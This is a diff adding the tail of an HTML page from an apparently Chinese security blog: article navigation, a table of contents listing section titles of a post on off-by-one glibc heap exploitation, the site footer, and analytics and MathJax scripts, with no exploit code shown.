+          Malloc Maleficarum堆溢出
+        
+      </div>
+    </a>
+  
+  
+    <a href="/20170104/glibcmalloc/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">深入理解glibc malloc</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0X01-什么是off-by-one漏洞"><span class="toc-number">1.</span> <span class="toc-text">0X01 什么是off-by-one漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X02-如何做到任意代码执行"><span class="toc-number">2.</span> <span class="toc-text">0X02 如何做到任意代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X03-为什么不是prev-size的最小影响字节-LSB-被覆盖"><span class="toc-number">3.</span> <span class="toc-text">0X03 为什么不是prev_size的最小影响字节(LSB)被覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X04-覆盖tls-dtor-list"><span class="toc-number">4.</span> <span class="toc-text">0X04 覆盖tls_dtor_list</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X05-为什么没能获取root-shell"><span class="toc-number">5.</span> <span class="toc-text">0X05 为什么没能获取root shell</span></a></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+      <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      版权所有&copy; 2017 Index of Computer System and Security 保留所有权利.
+      </div>
+      <div class="site-credit">
+        自豪地使用 <a href="https://github.com/iTimeTraveler/hexo-theme-hiero" target="_blank">hiero</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+</script>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/syssec" class="mobile-nav-link">Syssec</a>
+  
+    <a href="/architecture" class="mobile-nav-link">Architecture</a>
+  
+    <a href="/virtualization" class="mobile-nav-link">Virtualization</a>
+  
+    <a href="/malware" class="mobile-nav-link">Malware</a>
+  
+    <a href="/conferences" class="mobile-nav-link">Conferences</a>
+  
+    <a href="/academy" class="mobile-nav-link">Academy</a>
+  
+    <a href="/celebrity" class="mobile-nav-link">Celebrity</a>
+  
+    <a href="/contribution" class="mobile-nav-link">Contribution</a>
+  
+    <a href="/donation" class="mobile-nav-link">Donation</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+  
+
+  <div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1261078922&web_id=1261078922" language="JavaScript"></script>
+  </div>
+
+
+</body>
+</html>
